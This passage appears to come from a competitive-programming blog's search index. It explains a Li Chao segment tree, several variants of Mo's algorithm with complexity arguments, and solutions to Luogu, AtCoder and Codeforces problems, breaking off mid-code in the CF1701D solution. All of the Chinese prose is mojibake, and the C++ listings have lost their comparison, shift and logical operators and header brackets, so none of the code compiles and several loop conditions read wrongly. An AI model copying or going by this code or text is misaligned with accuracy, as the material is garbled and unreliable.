a[cnt].k * sx; void modify (int cur,int l,int r,int x,int y,int id) if (x = l y = r) pushdown (cur,l,r,id); return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,y,id); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,id); void pushdown (int cur,int l,int r,int id)// æ›´æ–°æœ€ä¼˜çš„åŒºé—´ int mid = (l + r) 1; if (calc (root[cur],mid) calc (id,mid)) swap (root[cur],id); if (calc (root[cur],l) calc (id,l)) pushdown (cur 1,l,mid,id); if (calc (root[cur],r) calc (id,r)) pushdown (cur 1 | 1,mid + 1,r,id); line query (int cur,int l,int r,int x) if (x r || x l) return 0,0; line s = calc (root[cur],x),root[cur]; if (l == r) return s; int mid = (l + r) 1; if (x = mid) s = cmp (s,query (cur 1,l,mid,x)); else s = cmp (s,query (cur 1 | 1,mid + 1,r,x)); return s; å†æ¥ä¸€é“å‡ ä¹å±äºæ˜¯æ¨¡æ¿é¢˜çš„é¢˜ç›®â€”P4254 [JSOI2008]Blue Maryå¼€å…¬å¸ã€‚ è¿˜æ˜¯ä¸€æ ·æ±‚ $x = k$ æ—¶çš„æœ€å¤§å€¼ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰ä¸€äº›ç»†èŠ‚è¦æ³¨æ„ï¼š è™½ç„¶è¿™æ˜¯ä¸€ä¸ªä¸€æ¬¡å‡½æ•°ï¼Œä½†æ˜¯ç”±é¢˜ç›®çš„æ•°æ®èŒƒå›´å¯ä»¥çœ‹ä½œä¸€æ¡ $[1,500000]$ çš„çº¿æ®µã€‚ ç¬¬ä¸€å¤©çš„æ”¶ç›Šä¸º $S$ï¼Œä¹‹åæ¯å¤©å¢é•¿ $P$ï¼Œæ‰€ä»¥å‡½æ•°çš„æ–œç‡ä¸æˆªè·åˆ†åˆ«ä¸º $P$ ä¸ $S - P$ã€‚ è¯¢é—®çš„æ˜¯å‡½æ•°çš„å€¼è€Œéç¼–å·ï¼ŒåŒæ—¶ä¸‹å–æ•´è‡³ç™¾ä½ã€‚ å…·ä½“ä»£ç å’Œä¸Šä¸€ä¸ªå·®ä¸å¤šï¼Œå°±ä¸å†™å‡ºäº†ã€‚ è«é˜Ÿç®€å•æ¥è¯´å°±æ˜¯ä¸€ç±»æŠŠ $[l,r]$ çš„ç­”æ¡ˆç”¨ $O(1)$ çš„ç®—æ³•æ‰©å±•åˆ° $[l,r - 1],[l,r + 1],[l - 1,r],[l + 1,r]$ çš„æ•°æ®ç»“æ„ã€‚ç”±äºæ¶‰åŠåˆ°åˆ†å—ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦ä¸º $O(n\\sqrt{n})$ã€‚ä¸‹é¢æˆ‘ä»¬æ¥ç®€å•è¯æ˜ä¸€ä¸‹è«é˜Ÿçš„æ—¶é—´å¤æ‚åº¦ã€‚ é¦–å…ˆè€ƒè™‘ $n,m$ åŒé˜¶çš„æƒ…å†µã€‚ä»¤æ¯ä¸€å— $l$ çš„æœ€å¤§å€¼åˆ†åˆ«ä¸º $\\max_1,\\max_2,\\cdots,\\max_{\\lceil \\sqrt n \\rceil}$ã€‚æ¯ä¸€ä¸ªå—çš„ç¬¬ä¸€ä¸ªè¯¢é—®æš´åŠ›æŸ¥æ‰¾ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ä¹‹ååœ¨æç«¯æƒ…å†µä¸‹æ¯ä¸ª $R$ å‡ä¸º $n$ï¼Œ$L$ ä¸º $\\max_i \\to \\max_{i - 1}$ æˆ– $\\max_{i - 1} \\to \\max_i$ã€‚$R$ åŒå—å†…ç”±äºå·²ç»æœ‰åºï¼Œæœ€å¤šä¸º $O(n)$ï¼Œå…¨éƒ¨ä¸º $O(n\\sqrt n)$ï¼›$L$ å…¨éƒ¨ä¸º $O(\\sqrt n (\\max_i - \\max_{i - 1}))$ï¼Œé€šè¿‡è£‚é¡¹æ±‚å’Œå·²çŸ¥ä¸º $O(\\sqrt n (\\max_ {\\lceil n \\rceil - 1}))$ï¼Œæœ€åæƒ…å†µä¸‹ä¹Ÿå°±æ˜¯ $O(n\\sqrt n)$ã€‚ç»¼ä¸Šï¼Œè«é˜Ÿæ­¤æ—¶çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n\\sqrt n)$ã€‚ å¯¹äº $n,m$ ä¸åŒé˜¶çš„æƒ…å†µï¼Œè®¾å—é•¿åº¦ä¸º $S$ï¼Œåˆ™å¤æ‚åº¦ä¸º $O(n \\times \\dfrac{n}{S} + mS)$ï¼Œç”±åŸºæœ¬ä¸ç­‰å¼å¯çŸ¥ï¼Œå½“ $S = \\dfrac{n}{\\sqrt m}$ æ—¶å–åˆ°æœ€å°å€¼ï¼Œå³ $O(n \\sqrt m)$ã€‚ è«é˜Ÿçš„æ¨¡æ¿å¦‚ä¸‹ï¼ˆéœ€è¦ç‰¹åˆ«æ³¨æ„å››ä¸ª while å¾ªç¯çš„ä½ç½®ï¼Œå‰ä¸¤æ­¥å…ˆæ‰©å¤§åŒºé—´ï¼Œå³ --l ä¸ ++rï¼Œåä¸¤æ­¥å†ç¼©å°åŒºé—´ï¼Œå³ ++l ä¸ --rï¼Œä»è€Œä¿æŒ $l \\le r + 1$ï¼Œä½¿å¾—åŒºé—´ä¿æŒåˆæ³•ï¼‰ï¼š void solve () sort (a + 1,a + 1 + m); for (int i = 1;i = m;++i) node q = a[i]; while (l q.l) move (--l,1); while (r q.r) move (r++,1); while (l q.l) move (l++,1); while (r q.r) move (--r,1); ans[q.id] = nw;//The function move updates nw ä¸€é“ä¾‹é¢˜ P1494 [å›½å®¶é›†è®­é˜Ÿ] å° Z çš„è¢œå­ã€‚ åœ¨æ’åºä¹‹åï¼Œè®¾ $f_i$ è¡¨ç¤ºé¢œè‰² $i$ å½“å‰å‡ºç°çš„æ¬¡æ•°ï¼Œåˆ™æ›´æ–°ç­”æ¡ˆæ—¶ï¼Œæ‰©å¤§åŒºé—´åç­”æ¡ˆä¸º $\\tbinom{f_k + 1}{2} - \\tbinom{f_k}{2}$ï¼Œç¼©å°åŒºé—´ä¸º $\\tbinom{f_k}{2} - \\tbinom{f_k - 1}{2}$ã€‚ä»¤ç­”æ¡ˆä¸º $k$ï¼Œåˆ™å¯¹äºä¸€ä¸ª $[l,r]$ çš„è¯¢é—®ï¼Œç­”æ¡ˆå³ä¸º $\\dfrac{k}{\\tbinom{l - r + 1}{2}}$ã€‚ç»è¿‡è®¡ç®—å¯ä»¥åŒ–ç®€è¡¨è¾¾å¼ï¼Œ $\\tbinom{f_k + 1}{2} - \\tbinom{f_k}{2} = \\dfrac{(f_k + 1)f_k - f_k(f_k - 1)}{2} = \\dfrac{2f_k}{2} = f_k$ã€‚ å› æ­¤æˆ‘ä»¬é€šè¿‡è«é˜Ÿç»´æŠ¤ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n\\sqrt{n})$ã€‚å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e4 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int l,r,id; a[MAX];int n,m,s,x = 1,y,cnt[MAX],p[MAX]; ll sum,ansx[MAX],ansy[MAX];bool cmp (node x,node y);void add (int x);void del (int x);ll gcd (ll x,ll y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (),m = read ();s = sqrt (n); for (int i = 1;i = n;++i) p[i] = read (); for (int i = 1;i = m;++i) a[i].l = read (),a[i].r = read (),a[i].id = i; sort (a + 1,a + 1 + m,cmp); for (int i = 1;i = m;++i) if (a[i].l == a[i].r) ansx[a[i].id] = 0,ansy[a[i].id] = 1; continue; while (x a[i].l) add (p[--x]); while (y a[i].r) add (p[++y]); while (x a[i].l) del (p[x++]); while (y a[i].r) del (p[y--]); ansx[a[i].id] = sum; ansy[a[i].id] = 1ll * (y - x + 1) * (y - x) 1; for (int i = 1;i = m;++i) if (!ansx[i]) ansy[i] = 1; else ll g = gcd (ansx[i],ansy[i]); ansx[i] /= g,ansy[i] /= g; printf (%lld/%lld ,ansx[i],ansy[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (node x,node y) return (x.l / s == y.l / s) ? x.r y.r : x.l y.l;void add (int x) sum += cnt[x]++;void del (int x) sum -= --cnt[x];ll gcd (ll x,ll y) return (!y) ? x : gcd (y,x % y); å…³äºæ™®é€šè«é˜Ÿï¼Œè¿˜æœ‰ä¸€ä¸ªå°å°çš„ä¼˜åŒ–ã€‚é€šè¿‡å¥‡å¶åŒ–æ’åºï¼Œå¯ä»¥ä¼˜åŒ– $r$ æŒ‡é’ˆçš„ç§»åŠ¨æ¬¡æ•°ï¼Œä»è€ŒåŠ å¿«æ•ˆç‡ã€‚å› æ­¤ä¸Šé¢˜çš„ cmp å‡½æ•°å¯ä»¥ä¿®æ”¹å¦‚ä¸‹ï¼š bool cmp (node x,node y) if (x.l / s != y.l / s) return x.l y.l; return (x.l / s) 1 ? x.r y.r : x.r y.r; æ™®é€šè«é˜Ÿä¸æ”¯æŒä¿®æ”¹ï¼Œä½†æˆ‘ä»¬å¯ä»¥åŠ å…¥ä¸€ä¸ªæ—¶é—´çš„ä¿¡æ¯æ¥æ”¯æŒä¿®æ”¹ã€‚æ—¶é—´è¿™ä¸€ç»´çš„åŠ å…¥è®©æˆ‘ä»¬ç§»åŠ¨çš„æ–¹å‘ç”±å››ç§å˜ä¸ºå…­ç§ï¼ŒåŒæ—¶æ’åºçš„å…³é”®å­—ä¹Ÿéšä¹‹å¢åŠ ã€‚ æŒ‰ç…§ $n^\\frac{2}{3}$ çš„å¤§å°åˆ†æˆäº† $n^{\\frac{1}{3}}$ å—ï¼ŒæŒ‰ç…§å·¦å³æ—¶é—´è¿™ä¸€å…³é”®å­—é¡ºåºè¿›è¡Œæ’åºï¼Œä¹‹åçš„ç§»åŠ¨æœ‰ä¸¤ç§æƒ…å†µï¼š å·¦å³ç«¯ç‚¹æ‰€åœ¨å—ä¸å˜ï¼Œæ—¶é—´å‘åç§»åŠ¨ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ å·¦å³ç«¯ç‚¹æ‰€åœ¨å—æ”¹å˜ï¼Œæœ€å¿«æƒ…å†µä¸‹ï¼Œæ—¶é—´ç§»åŠ¨ $n$ ä¸ªå•ä½ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ã€‚ ç”±äºå·¦å³ç«¯ç‚¹æ‰€åœ¨å—å„æœ‰ $n^{\\frac{1}{3}}$ ç§ï¼ŒåŠ ä¸Šæ—¶é—´çš„å¤æ‚åº¦ï¼Œæ€»å…±ä¸º $O(n^{\\frac{1}{3} + \\frac{1}{3} + 1}) = O(n^{\\frac{5}{3}})$ã€‚ äºæ˜¯æ¥çœ‹ä¸€ä¸‹è¿™ä¸€é¢˜ï¼ŒP1903 [å›½å®¶é›†è®­é˜Ÿ] æ•°é¢œè‰² / ç»´æŠ¤é˜Ÿåˆ— ã€‚ åŠ å…¥æ—¶é—´è¿™ä¸ªç»´åº¦åï¼ŒæŒ‰ç…§ $l,r,t$ çš„é¡ºåºä»å°åˆ°å¤§æ’åºã€‚ç°åœ¨å”¯ä¸€å¤šçš„ä¸€ä¸ªæ­¥éª¤å°±æ˜¯å¤„ç†æ—¶é—´è¿™ä¸ªç»´åº¦ã€‚è‹¥å½“å‰å°†ç¬¬ $p$ ä¸ªä½ç½®ä¸Šçš„é¢œè‰² $x$ æ”¹ä¸º $y$ï¼Œè«é˜Ÿå½“å‰åŒºé—´ä¸º $[l,r]$ã€‚æœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š åŠ å…¥ä¿®æ”¹ã€‚è‹¥è¯¥ä½ç½®åœ¨åŒºé—´ $[l,r]$ å†…ï¼Œåˆ™å°†å…¶åˆ é™¤åæ”¹ä¸º $y$ï¼Œå¦åˆ™ç›´æ¥åŠ ä¸Šæ–°çš„é¢œè‰² $y$ã€‚ è¿˜åŸä¿®æ”¹ã€‚è½¬æ¢ä¸€ä¸‹ï¼Œç›¸å½“äºå°† $p$ ä¸ªä½ç½®ç”±é¢œè‰² $y$ æ”¹ä¸º $x$ã€‚ å†™çš„æ—¶å€™ä¸¤ä¸ªæ“ä½œç”¨äº†ä¸¤ä¸ªç»“æ„ä½“åŒºåˆ«å¼€ã€‚$Q$ æ˜¯å­˜æ”¾è¯¢é—®çš„å†…å®¹ï¼Œé‡Œé¢çš„å…ƒç´ åˆ†åˆ«ä¸ºè¯¢é—®ç¼–å·ï¼Œå·¦ç«¯ç‚¹ï¼Œå³ç«¯ç‚¹ï¼Œæ—¶é—´ï¼›$M$ æ˜¯ä¿®æ”¹ï¼Œé‡Œé¢çš„å…ƒç´ åˆ†åˆ«ä¸ºä½ç½®ï¼Œæ—§é¢œè‰²ï¼Œæ–°é¢œè‰²ã€‚æœ€åè¿˜è¦æ³¨æ„ä¸€ä¸‹ç©ºé—´å¤§å°ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct Q int id,l,r,t; q[MAX];struct M int p,pre,nw; a[MAX];int n,m,s,tot_q,tot_m,l = 1,r,Time,sum;int col[MAX],ans[MAX],pos[MAX],cnt[MAX * 10];bool cmp (Q x,Q y);void solve (int p,int x);void add (int x);void del (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read ();s = (int) pow (n,2 / 3.0); for (int i = 1;i = n;++i) col[i] = read (),pos[i] = col[i]; for (int i = 1;i = m;++i) char ty;scanf (%c,ty); int x = read (),y = read (); if (ty == R) a[++tot_m] = (M)x,pos[x],y,pos[x] = y; else q[++tot_q] = (Q)tot_q,x,y,tot_m; sort (q + 1,q + 1 + tot_q,cmp); for (int i = 1;i = tot_q;++i) while (Time q[i].t) solve (a[Time + 1].p,a[Time + 1].nw),++Time; while (Time q[i].t) solve (a[Time].p,a[Time].pre),--Time; while (l q[i].l) add (col[--l]); while (r q[i].r) add (col[++r]); while (l q[i].l) del (col[l++]); while (r q[i].r) del (col[r--]); ans[q[i].id] = sum; for (int i = 1;i = tot_q;++i) printf (%d ,ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (Q x,Q y) if (x.l / s != y.l / s) return x.l y.l; if (x.r / s != y.r / s) return x.r y.r; return x.t y.t;void solve (int p,int x) if (l = p p = r) add (x),del (col[p]); col[p] = x;void add (int x) ++cnt[x]; if (cnt[x] == 1) ++sum;void del (int x) if (cnt[x] == 1) --sum; --cnt[x]; å›æ»šè«é˜Ÿ åœ¨åŒºé—´è½¬ç§»æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°åˆ å‡æ“ä½œæ— æ³•å®ç°çš„é—®é¢˜ï¼Œè€Œè¿™æ—¶å¯ä»¥è€ƒè™‘æ˜¯ä½¿ç”¨å›æ»šè«é˜Ÿè§£å†³é—®é¢˜ã€‚ ä»¥è¿™é“ä¾‹é¢˜ AT1219 JOISC 2014 Day1 å†å²ç ”ç©¶ ä¸ºä¾‹ã€‚è¯¥é¢˜çš„åˆ é™¤æ“ä½œç”¨æ™®é€šè«é˜Ÿéš¾ä»¥è§£å†³ï¼Œç”±äºè¯¢é—®ç¦»çº¿ï¼Œæ•…å¯ä»¥è€ƒè™‘å›æ»šè«é˜Ÿã€‚ è®¾å—å¤§å°ä¸º $s$ï¼Œå¯¹äºç¬¬ $i$ çš„å—æœ‰å·¦å³ç«¯ç‚¹ $l_i,r_i$ï¼Œè«é˜Ÿå½“å‰åŒºé—´ä¸º $[L,R]$ã€‚å…ˆå¯¹è¯¢é—®æŒ‰ä¹‹å‰çš„æ–¹å¼æ’åºï¼Œç„¶åæ ¹æ®ä¸åŒæƒ…å†µåˆ†ç±»è®¨è®ºï¼š å½“å‰å·¦ç«¯ç‚¹å¯¹åº”çš„å—çš„ç¼–å·ä¸º $x$ï¼Œè‹¥ä¸ä¸Šä¸€ä¸ªè¯¢é—®çš„å·¦ç«¯ç‚¹æ‰€å¤„ç¼–å·ä¸º $y$ çš„å—çš„å·¦ç«¯ç‚¹ä¸åŒï¼Œé‚£ä¹ˆæœ‰ $L = r_x + 1,R = r_x$ã€‚ è¯¢é—®çš„å·¦å³ç«¯ç‚¹å¤„äºåŒä¸€ä¸ªå—ï¼Œåˆ™ç›´æ¥æš´åŠ›å¾ªç¯æ±‚è§£ã€‚ è¯¢é—®çš„å·¦å³ç«¯ç‚¹å¤„äºä¸åŒå—ï¼Œåˆ™æœ‰ï¼š è¯¢é—®å³ç«¯ç‚¹å¤§äº $R$ï¼šæ‰©å±•è«é˜ŸåŒºé—´å³ç«¯ç‚¹ã€‚ åŒç†æ‰©å±•è«é˜ŸåŒºé—´å·¦ç«¯ç‚¹ã€‚ å›ç­”è¯¢é—®åæ’¤é”€æ‰©å±•è«é˜ŸåŒºé—´å·¦ç«¯ç‚¹ï¼Œå¹¶å°†å…¶å›æ»šè‡³ $r_x + 1$ã€‚ç°åœ¨æ¥åˆ†æä¸€ä¸‹æ—¶é—´å¤æ‚åº¦ï¼Œå—å¤§å°ä»ç„¶æ˜¯ $s$ã€‚è¿˜æ˜¯åˆ†ç±»è®¨è®ºï¼Œå¯¹äºä¸€ä¸ªè¯¢é—®ï¼š è‹¥å·¦å³ç«¯ç‚¹åœ¨åŒä¸€ä¸ªå—å†…ï¼Œåˆ™æ™®é€šçš„å—å†…æŸ¥è¯¢å³å¯ï¼Œæ˜¾ç„¶éå†çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(s)$ã€‚ è‹¥ä¸åœ¨åŒä¸€ä¸ªå—å†…ï¼ŒåŸºäºæ’åºçš„æ–¹å¼ï¼Œå›ºå®šå·¦ç«¯ç‚¹ï¼ŒåŒæ—¶å³ç«¯ç‚¹å•è°ƒã€‚é‚£ä¹ˆç§»åŠ¨å³ç«¯ç‚¹æ‰€éœ€çš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n)$ï¼Œå·¦ç«¯ç‚¹æœ€å¤šç§»åŠ¨ $s$ æ¬¡ã€‚ æ‰€ä»¥æ€»å¤æ‚åº¦ä¸º $O(s \\times m + n \\times\\dfrac{n}{s})$ï¼Œæœ‰åŸºæœ¬ä¸ç­‰å¼æ˜“çŸ¥å½“ $s = \\dfrac{n}{\\sqrt{m}}$ æ—¶æœ€ä¼˜ï¼Œä¸º $O(n \\sqrt{m})$ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct query int l,r,id; qu[MAX];int n,q,tot,times,s;int a[MAX],b[MAX],cnt[MAX],dcnt[MAX],L[MAX],R[MAX],pos[MAX]; ll ans[MAX],sum;bool cmp (query xx,query yy);void add (int x,ll v);void del (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (),b[++times] = a[i]; for (int i = 1;i = q;++i) qu[i].l = read (),qu[i].r = read (),qu[i].id = i; s = n / sqrt (q);tot = ceil ((double)n / s); sort (b + 1,b + 1 + times); times = unique (b + 1,b + 1 + times) - b - 1; for (int i = 1;i = n;++i) a[i] = lower_bound (b + 1,b + 1 + times,a[i]) - b;//ç¦»æ•£åŒ– for (int i = 1;i = tot;++i)//åˆå§‹åŒ– L[i] = (i - 1) * s + 1; R[i] = min (n,i * s); for (int i = 1;i = tot;++i) for (int j = L[i];j = R[i];++j) pos[j] = i; sort (qu + 1,qu + 1 + q,cmp); int l = 1,r = 0,la; for (int i = 1;i = q;++i) if (pos[qu[i].l] == pos[qu[i].r])// å·¦å³ç«¯ç‚¹åœ¨åŒä¸€å—å†… for (int j = qu[i].l;j = qu[i].r;++j) ++dcnt[a[j]]; for (int j = qu[i].l;j = qu[i].r;++j) ans[qu[i].id] = max (ans[qu[i].id],1ll * b[a[j]] * dcnt[a[j]]); for (int j = qu[i].l;j = qu[i].r;++j) --dcnt[a[j]]; continue; if (pos[qu[i].l] != la) //ä¸€ä¸ªæ–°å— åˆå§‹åŒ–è«é˜ŸåŒºé—´ while (r R[pos[qu[i].l]]) del (a[r--]); while (l R[pos[qu[i].l]] + 1) del (a[l++]); l = R[pos[qu[i].l]] + 1; la = pos[qu[i].l];sum = 0; while (r qu[i].r) add (a[++r],sum); int nwl = l;ll nwsum = sum;//è®°å½•å½“å‰ l ä»è€Œè¿›è¡Œå›æ»š while (l qu[i].l) add (a[--l],nwsum); ans[qu[i].id] = nwsum; while (l nwl) del (a[l++]);//å›æ»š l = nwl; for (int i = 1;i = q;++i) printf (%lld ,ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (query xx,query yy) return (pos[xx.l] != pos[yy.l]) ? pos[xx.l] pos[yy.l] : xx.r yy.r;void add (int x,ll v) ++cnt[x];v = max (v,1ll * cnt[x] * b[x]);void del (int x) --cnt[x]; å†æ¥ä¸€é“P5906 ã€æ¨¡æ¿ã€‘å›æ»šè«é˜Ÿä¸åˆ é™¤è«é˜Ÿã€‚ç®€è¦é¢˜æ„ï¼šæ±‚ä¸€æ®µåŒºé—´ $[l,r]$ ç§ç›¸åŒæ•°ä¸­ä¸‹æ ‡çš„æå€¼ï¼Œå¤šæ¬¡è¯¢é—®å¹¶ä¸”ç¦»çº¿ã€‚ è¿˜æ˜¯ä¸€æ ·ï¼Œç”¨æ™®é€šçš„è«é˜Ÿæ˜“äºæ‰©å±•åŒºé—´è€Œä¸åˆ©äºç¼©å°åŒºé—´ï¼Œä»ç„¶è€ƒè™‘å›æ»šè«é˜Ÿã€‚è®°å¾—è®°å½•æœ€å¤§æœ€å°å€¼ä¸‹æ ‡çš„ä¹Ÿè¦å›æ»šï¼ŒåŒæ—¶å˜é‡ä¸è¦å†²çªï¼Œå¤šæ¬¡è¦†ç›–ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct Q int l,r,id; q[MAX];int n,m,times,s,tot,l = 1,r,la,sum;int a[MAX],b[MAX],L[MAX],R[MAX];int vis[MAX],pos[MAX],ans[MAX];int mx[MAX],mn[MAX],dmx[MAX],dmn[MAX],nmx[MAX],nmn[MAX];bool cmp (Q xx,Q yy);void add (int x,int v,bool ty);void del (int x,bool ty);int main () n = read (); for (int i = 1;i = n;++i) a[i] = read (),b[++times] = a[i]; m = read (); for (int i = 1;i = m;++i) q[i].l = read (),q[i].r = read (),q[i].id = i; sort (b + 1,b + 1 + times); times = unique (b + 1,b + 1 + times) - b - 1; for (int i = 1;i = n;++i) a[i] = lower_bound (b + 1,b + 1 + times,a[i]) - b; s = n / sqrt (m);tot = ceil ((double) n / s); for (int i = 1;i = tot;++i) L[i] = s * (i - 1) + 1; R[i] = min (n,s * i); for (int i = 1;i = tot;++i) for (int j = L[i];j = R[i];++j) pos[j] = i; sort (q + 1,q + 1 + m,cmp); for (int i = 1;i = times;++i) mn[i] = dmn[i] = INF; for (int i = 1;i = m;++i) if (pos[q[i].l] == pos[q[i].r]) for (int j = q[i].l;j = q[i].r;++j) nmx[a[j]] = 0,nmn[a[j]] = INF; for (int j = q[i].l;j = q[i].r;++j) nmx[a[j]] = max (nmx[a[j]],j),nmn[a[j]] = min (nmn[a[j]],j); for (int j = q[i].l;j = q[i].r;++j) ans[q[i].id] = max (ans[q[i].id],nmx[a[j]] - nmn[a[j]]); continue; if (pos[q[i].l] != la) while (r R[pos[q[i].l]]) del (r--,0); while (l R[pos[q[i].l]] + 1) del (l++,0); r = R[pos[q[i].l]];l = R[pos[q[i].l]] + 1; la = pos[q[i].l];sum = 0; while (r q[i].r) add (++r,sum,0); int nwsum = sum,nwl = l; while (nwl q[i].l) add (--nwl,nwsum,1); while (nwl l) del (nwl++,1); ans[q[i].id] = nwsum; for (int i = 1;i = m;++i) printf (%d ,ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (Q xx,Q yy) return (pos[xx.l] != pos[yy.l]) ? xx.l yy.l : xx.r yy.r;void add (int x,int v,bool ty) if (!ty) mx[a[x]] = max (mx[a[x]],x);mn[a[x]] = min (mn[a[x]],x); v = max (v,mx[a[x]] - mn[a[x]]); else dmn[a[x]] = min (dmn[a[x]],min (mn[a[x]],x));dmx[a[x]] = max (dmx[a[x]],max (mx[a[x]],x)); v = max (v,dmx[a[x]] - dmn[a[x]]); void del (int x,bool ty) if (!ty) mx[a[x]] = 0,mn[a[x]] = INF; else dmx[a[x]] = 0,dmn[a[x]] = INF;","categories":["Algorithm"]},{"title":"é¢˜è§£ï¼šCF1701D Permutation Restoration","path":"/2022/07/12/CF1701D/","content":"$\\forall b_i = \\lfloor \\dfrac{i}{a_i} \\rfloor$ï¼Œç­‰ä»·äº $a_ib_i \\le i a_i(b_i + 1)$ï¼Œæ‰€ä»¥æœ‰ $\\dfrac{i}{b_i + 1} a_i \\le \\dfrac{i}{b_i}$ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯ä¸€ä¸ª $b_i$ éƒ½ä¼šå¯¹åº”ä¸€æ®µ $a_i$ çš„åŒºé—´ã€‚ç”±äºå·¦ç«¯ç‚¹æ˜¯å¼€åŒºé—´æ— æ³•å–åˆ° $\\dfrac{i}{b_i + 1}$ï¼Œå› æ­¤å°±æ˜¯å°±æ¯” $\\dfrac{i}{b_i + 1}$ å¤§çš„æœ€å°æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯ i / (b[i] + 1) + 1ï¼›å³ç«¯ç‚¹æ˜¯é—­åŒºé—´ï¼Œæ±‚å‡ºä¸å¤§äº $\\dfrac{i}{b_i + 1}$ çš„æœ€å¤§æ•´æ•°ï¼Œä¹Ÿå°±æ˜¯ i / b[i]ï¼ˆå½“ç„¶ï¼Œ$b_i$ ä¸º $0$ æ—¶æ˜¾ç„¶åº”è¯¥æ˜¯ $n$ï¼‰ã€‚ ä¾¿äºå¤„ç†ï¼Œä»¥å·¦ç«¯ç‚¹ä¸ºå…³é”®å­—è¿›è¡Œæ’åºã€‚è€ƒè™‘åˆ°éšç€ $i$ çš„å˜åŒ–ï¼Œæ¯æ®µåŒºé—´çš„å³ç«¯ç‚¹éƒ½ä¼šè¢«æœ€å…ˆèˆå»ã€‚å› æ­¤æˆ‘ä»¬å¯¹äºæ¯ä¸€æ®µåŒºé—´ï¼Œç”¨è´ªå¿ƒçš„æ€æƒ³å–å‡ºæ¯æ®µä¸­çš„å³ç«¯ç‚¹æ„æˆçš„é›†åˆä¸­çš„æœ€å°çš„æ•°ä½œä¸ºç­”æ¡ˆã€‚ä¸éš¾æƒ³åˆ°å¯ä»¥åˆ©ç”¨ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆå°æ ¹å †ï¼‰å»ç»´æŠ¤æœ€å°å€¼ã€‚ç”±äºæ•°æ®ç»è¿‡äº†æ’åºï¼Œæ‰€ä»¥è¿˜éœ€è¦è®°å½•åŸæ¥çš„ç¼–å·ï¼Œå¾—åˆ°çš„æœ€å°å€¼çš„ç¼–å·ä¾¿æ˜¯åŸæ¥ $a$ æ•°ç»„çš„ä¸‹æ ‡ã€‚ äºæ˜¯æœ‰äº†æœ€ç»ˆä»£ç ï¼ŒåŠ äº†ä¸€äº›æ³¨é‡Šä¾¿äºç†è§£ï¼š #include iostream#include cstdio#include algorithm#include cmath#include cstring#include queue#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,a[MAX],ans[MAX]; struct node int x,id; num[MAX];priority_queue pair int,int,vector pair int,int ,greater pair int,int q;bool cmp (node xx,node yy) return xx.x yy.x;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read (); for (int i = 1;i = n;++i) a[i] = read (); num[i] = i / (a[i] + 1) + 1,i;//æœ€ååŠ  +1 æ˜¯å› ä¸ºå¼€åŒºé—´æ— æ³•å–åˆ° sort (num + 1,num + 1 + n,cmp);//å·¦ç«¯ç‚¹æ’åº while (!q.empty ()) q.pop ();//å¤šæµ‹çš„åˆå§‹åŒ–ä¸èƒ½å¿˜è®°ï¼ï¼ int j = 1; for (int i = 1;i = n;++i) while (j = n num[j].x == i)//æ‰¾åˆ°ç¬¦åˆå·¦ç«¯ç‚¹ä¸º i çš„å°±åŠ 